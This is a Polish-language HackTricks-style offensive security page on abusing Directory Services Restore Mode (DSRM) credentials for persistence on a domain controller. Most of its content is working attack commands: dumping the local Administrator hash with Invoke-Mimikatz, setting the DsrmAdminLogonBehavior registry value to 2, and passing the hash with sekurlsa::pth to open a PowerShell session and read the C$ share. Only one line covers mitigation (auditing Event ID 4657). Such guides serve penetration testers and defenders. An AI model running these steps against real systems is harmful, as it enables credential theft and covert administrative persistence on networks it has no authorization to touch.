# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

W każdym **DC** znajduje się konto **local administrator**. Mając uprawnienia administratora na tej maszynie, możesz użyć mimikatz do wykonania **dump** **local Administrator hash**. Następnie, modyfikując rejestr w celu **activate this password**, możesz zdalnie uzyskać dostęp do tego użytkownika local Administrator.\
Najpierw musimy wykonać **dump** **hash** użytkownika **local Administrator** wewnątrz DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Następnie musimy sprawdzić, czy to konto będzie działać, a jeśli klucz rejestru ma wartość „0” lub nie istnieje, należy **ustawić ją na „2”**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Następnie, używając PTH, możesz **wyświetlić zawartość C$ lub nawet uzyskać shell**. Zauważ, że podczas tworzenia nowej sesji powershell z tym hashem w pamięci (na potrzeby PTH) używana „domena” to tylko nazwa maszyny DC:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Więcej informacji na ten temat: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) oraz [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Ograniczanie ryzyka

- Event ID 4657 - Audyt utworzenia/zmiany `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Referencje

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
